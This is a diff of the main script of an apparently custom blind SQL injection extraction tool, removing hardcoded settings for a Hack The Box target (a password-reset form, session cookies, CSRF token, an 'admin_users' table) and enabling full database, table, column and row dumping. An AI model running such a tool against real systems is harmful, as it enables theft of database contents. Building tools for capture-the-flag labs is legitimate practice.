@@ -6,7 +6,6 @@ import time
 from pwn import log
 
 import utils
-import structs
 from classes import (
     Extractor,
     GetRequest,
@@ -29,6 +28,17 @@ signal.signal(signal.SIGINT, ctrlC)
 
 
 def main():
+
+    # Initiate parameters specifying them
+    main_url = ""
+    headers = {}
+    method = PostRequest()
+    data = {}
+    atribute_to_exploit = ""
+    condition = TextInCondition("")
+    payload = ConditionalPayload()
+    num_threads = 1
+
     print(
         f"""
     {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}
@@ -40,21 +50,6 @@ def main():
     {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}\n
     """
     )
-
-    # Initiate parameters specifying them
-    main_url = "http://usage.htb/forget-password"
-    headers = {
-        "Cookie": "XSRF-TOKEN=eyJpdiI6IkQya244dG1yNFArTkNSRktHOGZVUEE9PSIsInZhbHVlIjoiVU5YcGI3R2JUUTR5aFZNRkpxRzlib2N3eWdVTlJlM2FOZy82TitIQmt2THNVSGFGaWp1eERob2xFenBTWWkxSk5ldXUrNHZhS2FjcFUzMlIyRk4zdXBjdzV2VnQ4Z1R2NE5sTVhMQ0cyOFdxczZLVTlxWkdlQUV5R1FEaGdQTnoiLCJtYWMiOiJjYWUxYWI1MDA1MmMyYWU5YTc5YzQ1NjA4MWE0MDMxNGQzYjEyYmU4YmFlODhiN2Q2MzhmOTc5NGUzMzRiODliIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImNYUExKUmZ0M0J2OFQ5Z0JRcjJ0ckE9PSIsInZhbHVlIjoiK3hyU2owVjJrMHRGMU9uMU44MEs3dnF2RWJlM2x2U3JRMDdjQWFZUTQrTElvMFVydXR5Z3NhSzRXN0kvZUFqUU0xaUxHM2dQUVNMWWRISUc3SnNMcm0xYStiKzJRM3ZoWjBicHV6OVhUOS9Vd3lkNEtEWXdYTGxQWFNlVEJiV0IiLCJtYWMiOiJiOThhMzA0MmE5ZmQxYTcyYTMwNThhMmNiMGEwOTA4OGVmOGIxNjk0YWFkMDE3YzI4ZWNkODgxYmE3NmExMDliIiwidGFnIjoiIn0%3D"
-    }
-    method = PostRequest()
-    data = {
-        "_token": "Me3jfd1A8zgq9XYzGmuSPr4sfEZDDwcusuTw6xU0",
-        "email": "test@gmail.com",
-    }
-    atribute_to_exploit = "email"
-    condition = TextInCondition("We have e-mailed your password reset link to ")
-    payload = ConditionalPayload()
-    num_threads = 1
 
     print(
         f"[{utils.Color.BLUE}+{utils.Color.END}] {utils.Color.BOLD}Url:{utils.Color.END} {main_url}"
@@ -95,15 +90,12 @@ def main():
     print("\n")
     time.sleep(1)
 
-    instance._dbs.append(structs.DB("usage_blog", []))
-    instance._dbs[0].tables.append(structs.Table("admin_users", [], []))
-
-    # instance.get_user(label_menu)
-    # instance.get_dbs(label_menu)
-    # instance.get_tables(label_menu)
+    instance.get_user(label_menu)
+    instance.get_dbs(label_menu)
+    instance.get_tables(label_menu)
     instance.get_columns(label_menu)
-    # instance.get_rows(label_menu)
-    # instance.build_file()
+    instance.get_rows(label_menu)
+    instance.build_file()
 
 
 if __name__ == "__main__":
